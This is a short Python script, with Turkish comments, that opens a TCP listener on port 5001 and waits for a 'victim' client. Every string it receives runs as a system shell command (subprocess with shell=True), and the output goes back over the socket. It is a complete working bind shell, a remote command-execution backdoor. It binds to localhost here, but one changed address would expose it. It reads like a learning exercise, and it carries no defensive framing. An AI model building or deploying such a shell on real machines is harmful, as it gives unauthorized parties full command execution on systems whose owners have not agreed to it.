import socket
import subprocess

host = '127.0.0.1'
port = 5001

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((host, port))
server_socket.listen(1)

print("📡 Sunucu hazır, kurban (client) bekleniyor...")
conn, addr = server_socket.accept()
print(f"✅ Bağlantı sağlandı: {addr}")

while True:
    data = conn.recv(1024).decode().strip()
    if not data or data.lower() == "quit":
        break
    
    # İŞTE OLAY BURADA: Komutu sistemde çalıştırıp çıktısını alıyoruz
    try:
        # shell=True terminalde yazıyormuşsun gibi davranır
        cikti = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
        response_data = cikti # Bu zaten byte formatında gelir
    except subprocess.CalledProcessError as e:
        response_data = f"Komut hatasi: {e.output.decode()}".encode()
    except Exception as e:
        response_data = f"Sistem hatasi: {str(e)}".encode()

    # Eğer komutun çıktısı boşsa (mesela cd komutu gibi)
    if not response_data:
        response_data = b"Komut calisti ama cikti yok."

    conn.send(response_data) # Veriyi geri gönderiyoruz

conn.close()